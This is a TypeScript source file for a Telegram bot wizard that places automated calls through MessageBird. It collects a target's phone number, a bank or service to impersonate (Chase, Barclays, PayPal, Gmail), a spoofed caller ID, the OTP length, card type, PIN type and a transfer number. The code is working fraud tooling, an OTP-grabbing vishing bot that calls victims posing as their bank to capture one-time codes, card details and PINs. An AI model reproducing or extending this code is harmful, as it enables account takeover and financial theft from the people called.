/* eslint-disable @typescript-eslint/no-explicit-any */
import { Middleware, Markup } from 'telegraf';
import { getLangAndVoice } from '../languages/helpers/getLangAndVoice';
import { C } from '../types';
import { UK_NUM, US_NUM } from '../utils/constants';
import { messagebirdMakeACall } from '../utils/messagebird';
import { getNotValidNumberMsg } from './helpers/getNotValidNumberMsg';

let chatId: number | undefined;

export const steps = (step: string): Array<Middleware<C>> => [
  async (ctx) => {
    await ctx.replyWithHTML(
      `👍🏽 Awesome, Let's start\n\nReply with the number 📱\n(ex. ${
        Math.round(Math.random()) ? UK_NUM : US_NUM
      })\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(
        /^./,
        step[0].toUpperCase(),
      )} ~</i></b>`,
      Markup.inlineKeyboard([Markup.button.callback('❌ Cancel', 'cancel')]),
    );
    ctx.wizard.state.callData = {};
    return ctx.wizard.next();
  },
  async (ctx) => {
    if (!ctx.message) {
      await ctx.reply(
        '🚫 Request expired, start again\n\n',
        Markup.inlineKeyboard([Markup.button.callback('Make a call', 'call')]),
      );

      return ctx.scene.leave();
    }

    // @ts-expect-error ts doesn't not recognise text on message
    const number = await getLangAndVoice(ctx.message.text);

    if (!number.language) {
      await ctx.replyWithHTML(`
Country not supported yet.

We currently suport:

    🇺🇸 United State 
    🇦🇺 Australia 
    🇬🇧 Great Britain 
    🇳🇿 New Zealand 
    🇿🇦 South Africa 
    🇪🇸 Spain 
    🇵🇹 Portugal 
    🇧🇷 Brazil 
    🇮🇹 Italia 
    🇫🇷 France 
    🇩🇪 Germany 
    🇳🇴 Norway 
    🇵🇱 Poland 
    🇸🇪 Sweden 
    🇹🇷 Turkey 
    🇳🇱 Netherland 
    🇩🇰 Denmark 

Send a number of any the countries mentioned above to continue or click /cancel to start again.
      `);
      return;
    }

    // if (!validateNumber(ctx.message.text)) {
    //   await ctx.replyWithHTML(
    //     `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
    //   );
    //   return;
    // }
    await ctx.replyWithHTML(
      `Good,\n\nReply with the ${
        step === 'account' ? 'institution name 🏢' : 'bank name 🏦'
      }\n(e.g ${
        /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
          // @ts-expect-error ts doesn't not recognise state
          ctx.message.text,
        )
          ? `${step === 'account' ? 'Gmail' : 'Barclays'}`
          : `${step === 'account' ? 'Paypal' : 'Chase'}`
      })\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(
        /^./,
        step[0].toUpperCase(),
      )} ~</i></b>`,
      Markup.inlineKeyboard([Markup.button.callback('❌ Cancel', 'cancel')]),
    );

    ctx.wizard.state.callData.number = number;

    return ctx.wizard.next();
  },
  async (ctx) => {
    await ctx.replyWithHTML(
      `Okay,\n\nReply with the caller ID 👤\n(e.g ${
        /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
          ctx.wizard.state.callData.number,
        )
          ? '448081961740'
          : '18882019292'
      })\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(
        /^./,
        step[0].toUpperCase(),
      )} ~</i></b>`,
      Markup.inlineKeyboard([Markup.button.callback('❌ Cancel', 'cancel')]),
    );

    // @ts-expect-error ts doesn't not recognise state
    ctx.wizard.state.callData.institutionName = ctx.message.text;
    return ctx.wizard.next();
  },
  ...(step === 'pay'
    ? [
        async (ctx: any) => {
          // if (!validateNumber(ctx.message.text)) {
          //   await ctx.replyWithHTML(
          //     `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
          //   );
          //   return;
          // }

          const number = await getLangAndVoice(ctx.message.text);
          if (!number.language) {
            await ctx.replyWithHTML(getNotValidNumberMsg());
            return;
          }

          await ctx.replyWithHTML(
            `Okay, how long is the OTP.\ne.g 4, 6 etc...`,
            Markup.inlineKeyboard([
              Markup.button.callback('❌ Cancel', 'cancel'),
            ]),
          );
          ctx.wizard.state.callData.callerId = ctx.message.text;
          return ctx.wizard.next();
        },
        async (ctx: any) => {
          if (!(typeof Number(ctx.message.text) === 'number')) {
            await ctx.replyWithHTML(`Please enter a number`);
            return;
          }
          await ctx.replyWithHTML(
            `Perfect, Reply with the wallet service name \n(e.g ${
              Math.round(Math.random()) ? 'Apple pay' : 'Google pay'
            })\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(
              /^./,
              step[0].toUpperCase(),
            )} ~</i></b>`,
            Markup.inlineKeyboard([
              Markup.button.callback('❌ Cancel', 'cancel'),
            ]),
          );

          ctx.wizard.state.callData.otpLength = Number(ctx.message.text);
          return ctx.wizard.next();
        },
      ]
    : []),
  ...(step === 'card'
    ? [
        async (ctx: any) => {
          // if (!validateNumber(ctx.message.text)) {
          //   await ctx.replyWithHTML(
          //     `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
          //   );
          //   return;
          // }

          const number = await getLangAndVoice(ctx.message.text);
          if (!number.language) {
            await ctx.replyWithHTML(getNotValidNumberMsg());
            return;
          }

          await ctx.replyWithHTML(
            `💳 Select card type\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(
              /^./,
              step[0].toUpperCase(),
            )} ~</i></b>`,
            Markup.inlineKeyboard([
              Markup.button.callback('Debit', 'debit'),
              Markup.button.callback('Credit', 'credit'),
            ]),
          );
          ctx.wizard.state.callData.callerId = ctx.message.text;
          return ctx.wizard.next();
        },
      ]
    : []),
  ...(step === 'pin'
    ? [
        async (ctx: any) => {
          // if (!validateNumber(ctx.message.text)) {
          //   await ctx.replyWithHTML(
          //     `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
          //   );
          //   return;
          // }

          const number = await getLangAndVoice(ctx.message.text);
          if (!number.language) {
            await ctx.replyWithHTML(getNotValidNumberMsg());
            return;
          }

          await ctx.replyWithHTML(
            `🔐 Select pin type\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(
              /^./,
              step[0].toUpperCase(),
            )} ~</i></b>`,
            Markup.inlineKeyboard([
              Markup.button.callback('Carrier Pin', 'carrierPin'),
              Markup.button.callback('Card Pin', 'cardPin'),
            ]),
          );
          ctx.wizard.state.callData.callerId = ctx.message.text;
          return ctx.wizard.next();
        },
      ]
    : []),
  ...(step === 'account'
    ? [
        async (ctx: any) => {
          // if (!validateNumber(ctx.message.text)) {
          //   await ctx.replyWithHTML(
          //     `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
          //   );
          //   return;
          // }

          const number = await getLangAndVoice(ctx.message.text);
          if (!number.language) {
            await ctx.replyWithHTML(getNotValidNumberMsg());
            return;
          }

          await ctx.replyWithHTML(
            `Okay, how long is the OTP.\ne.g 4, 6 etc...`,
            Markup.inlineKeyboard([
              Markup.button.callback('❌ Cancel', 'cancel'),
            ]),
          );
          ctx.wizard.state.callData.callerId = ctx.message.text;
          return ctx.wizard.next();
        },
        async (ctx: any) => {
          if (!(typeof Number(ctx.message.text) === 'number')) {
            await ctx.replyWithHTML(`Please enter a number`);
            return;
          }
          await ctx.replyWithHTML(
            "Grab card 💳 details\n\n<b>***Only click on yes if it's relevant***</b>\n\ne.g you're calling for PayPal OTP, you wouldn't ask card details for a Gmail OTP 🙄",
            Markup.inlineKeyboard([
              Markup.button.callback('Yes', 'yes'),
              Markup.button.callback('No', 'no'),
            ]),
          );
          ctx.wizard.state.callData.otpLength = Number(ctx.message.text);
          return ctx.wizard.next();
        },
        async (ctx: any) => {
          await ctx.replyWithHTML(
            `Click call once you have sent the OTP.\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(
              /^./,
              step[0].toUpperCase(),
            )} ~</i></b>`,
            Markup.inlineKeyboard([
              Markup.button.callback('Call now', 'accountCall'),
            ]),
          );
          return ctx.wizard.next();
        },
      ]
    : []),
  ...(step === 'pgp'
    ? [
        async (ctx: any) => {
          await ctx.reply(
            'Finally,\n\nReply with the number the call will be transfered to 👉🏽',
            Markup.inlineKeyboard([
              Markup.button.callback('❌ Cancel', 'cancel'),
            ]),
          );
          ctx.wizard.state.callData.callerId = ctx.message.text;
          return ctx.wizard.next();
        },
      ]
    : []),
  ...(step === `bank`
    ? [
        async (ctx: any) => {
          // if (!validateNumber(ctx.message.text)) {
          //   await ctx.replyWithHTML(
          //     `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
          //   );
          //   return;
          // }

          const number = await getLangAndVoice(ctx.message.text);
          if (!number.language) {
            await ctx.replyWithHTML(getNotValidNumberMsg());
            return;
          }

          await ctx.replyWithHTML(
            `Okay, how long is the OTP.\ne.g 4, 6 etc...`,
            Markup.inlineKeyboard([
              Markup.button.callback('❌ Cancel', 'cancel'),
            ]),
          );
          ctx.wizard.state.callData.callerId = ctx.message.text;
          return ctx.wizard.next();
        },
      ]
    : []),
  async (ctx) => {
    if (!ctx.wizard.state.callData) {
      return await ctx.reply(
        '🚫 Request expired, start again\n\n',
        Markup.inlineKeyboard([
          Markup.button.callback("🎬 Let's go", 'expired'),
        ]),
      );
    }

    if (step === 'pgp' && !ctx.wizard.state.callData.transferNumber) {
      if (
        !/^(?:\+?1[-.●]?)?\(?([0-9]{3})\)?[-.●]?([0-9]{3})[-.●]?([0-9]{4})$/.test(
          // @ts-expect-error ts doesn't not recognise text here
          ctx?.message?.text,
        )
      ) {
        return ctx.reply('Please enter a valid US number');
      }
      // @ts-expect-error ts doesn't not recognise text here
      ctx.wizard.state.callData.transferNumber = ctx?.message?.text;
    }

    // if (step === 'bank' && !ctx.wizard.state.callData.callerId) {
    //   // @ts-expect-error ts doesn't not recognise state
    //   if (!validateNumber(ctx.message.text)) {
    //     await ctx.replyWithHTML(
    //       `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
    //     );
    //     return;
    //   }
    //   // @ts-expect-error ts doesn't not recognise state
    //   ctx.wizard.state.callData.callerId = ctx.message.text;
    // }

    if (step === `bank` && !ctx.wizard.state.callData.otpLength) {
      if (
        ctx.message &&
        // @ts-expect-error ts doesn't not recognise state
        !(typeof Number(ctx.message.text) === 'number')
      ) {
        await ctx.replyWithHTML(`Please enter a number`);
        return;
      }

      // @ts-expect-error ts doesn't not recognise state
      ctx.wizard.state.callData.otpLength = Number(ctx.message.text);
    }

    const w = ctx.wizard.state.callData.wallet;
    ctx.wizard.state.callData.wallet = w
      ? w
      : ctx.message && step === 'pay'
      ? // @ts-expect-error ts doesn't not recognise state
        ctx.message.text
      : undefined;
    const {
      number,
      institutionName,
      callerId,
      wallet,
      cardType,
      askCardInfo,
      transferNumber,
      pinType,
      otpLength,
    } = ctx.wizard.state.callData;

    const country = number.country;

    await ctx.replyWithHTML(
      `Calling ${
        number.to
      }\nfrom ${callerId} as:\n\n${institutionName} 📲...\n\n<b><i>~ ${step.replace(
        /^./,
        step[0].toUpperCase(),
      )} ~</i>\n\n${country.flag} ${country.name}</b>`,
    );

    chatId =
      Number(ctx.scene.state.chatId) ||
      ctx.chat?.id ||
      ctx.from?.id ||
      undefined;

    if (!chatId || chatId !== ctx.chat?.id || chatId !== ctx.from?.id) {
      return ctx.reply(
        '🚫 Request expired, start again\n\n',
        Markup.inlineKeyboard([Markup.button.callback('Make a call', 'call')]),
      );
    }

    await messagebirdMakeACall({
      from: callerId,
      to: number.to,
      institutionName,
      transferNumber,
      step,
      wallet,
      cardType,
      askCardInfo,
      chatId,
      pinType,
      otpLength,
      language: number.language,
    });

    return ctx.wizard.next();
  },
];
